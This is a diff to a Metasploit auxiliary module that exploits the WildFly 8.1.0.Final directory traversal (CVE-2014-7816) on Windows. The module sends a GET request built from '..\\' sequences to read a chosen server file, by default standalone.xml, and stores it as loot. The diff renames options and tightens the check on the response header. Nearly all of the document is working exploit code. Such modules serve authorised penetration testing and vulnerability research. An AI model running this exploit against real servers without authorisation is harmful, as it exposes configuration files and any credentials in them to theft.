@@ -7,23 +7,24 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-  include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'WildFly 8 (JBossAS) Directory Traversal',
+      'Name'           => 'WildFly Directory Traversal',
       'Description'    => %q{
-        This module exploits a directory traversal vulnerability found in WildFly
-        8.1.0.Final webserver on port 8080.
+        This module exploits a directory traversal vulnerability found in the WildFly 8.1.0.Final
+        web server running on port 8080, named JBoss Undertow. The vulnerability only affects to
+        Windows systems.
       },
       'References'     =>
         [
-          [ 'CVE', '2014-7816' ],
-          [ 'URL', 'https://access.redhat.com/security/cve/CVE-2014-7816' ],
-          [ 'URL', 'https://www.conviso.com.br/advisories/CONVISO-14-001.txt' ],
-          [ 'URL', 'http://www.openwall.com/lists/oss-security/2014/11/27/4' ]
+          ['CVE', '2014-7816' ],
+          ['URL', 'https://access.redhat.com/security/cve/CVE-2014-7816'],
+          ['URL', 'https://www.conviso.com.br/advisories/CONVISO-14-001.txt'],
+          ['URL', 'http://www.openwall.com/lists/oss-security/2014/11/27/4']
         ],
       'Author'         => 'Roberto Soares Espreto <robertoespreto[at]gmail.com>',
       'License'        => MSF_LICENSE,
@@ -33,29 +34,26 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8080),
-        OptString.new("FILEPATH", [true, 'Full path to the file to read', 'standalone\\\\configuration\\\\standalone.xml'])
-      ], self.class)
-
-    register_advanced_options(
-      [
+        OptString.new('RELATIVE_FILE_PATH', [true, 'Relative path to the file to read', 'standalone\\configuration\\standalone.xml']),
         OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 1])
       ], self.class)
-
-    deregister_options('RHOST')
   end
 
   def run_host(ip)
-    print_status("Attempting to download: #{datastore['FILEPATH']}")
+    vprint_status("#{peer} - Attempting to download: #{datastore['RELATIVE_FILE_PATH']}")
 
     traversal = "..\\" * datastore['TRAVERSAL_DEPTH']
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => "/#{traversal}\\#{datastore['FILEPATH']}"
-    },)
+      'uri'    => "/#{traversal}\\#{datastore['RELATIVE_FILE_PATH']}"
+    })
 
-    if res && res.code == 200
+    if res &&
+        res.code == 200 &&
+        res.headers['Server'] &&
+        res.headers['Server'] =~ /WildFly/
       vprint_line(res.to_s)
-      fname = File.basename(datastore['FILEPATH'])
+      fname = File.basename(datastore['RELATIVE_FILE_PATH'])
 
       path = store_loot(
         'wildfly.http',
@@ -64,9 +62,9 @@ class Metasploit3 < Msf::Auxiliary
         res.body,
         fname
       )
-      print_status("File saved in: #{path}")
+      print_good("#{peer} - File saved in: #{path}")
     else
-      print_error("Nothing was downloaded")
+      vprint_error("#{peer} - Nothing was downloaded")
     end
   end
 end
